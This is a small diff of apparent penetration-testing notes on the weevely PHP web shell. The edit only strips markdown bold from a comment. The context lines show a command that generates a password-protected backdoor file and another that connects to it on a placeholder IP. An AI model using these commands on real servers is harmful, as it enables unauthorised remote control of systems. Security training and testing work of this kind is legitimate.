@@ -12,7 +12,7 @@ weevely generate 1234 ./weevley.php
 # weevely http://xxx.xxx.xxx.xxx/<outputfile.php> <password>
 
 weevely http://xxx.xxx.xxx.xxx/weevley.php 1234
-# **type ":help" for more commands**
+# type ":help" for more commands
 # use ctrl-c to exit
 
 # run single command
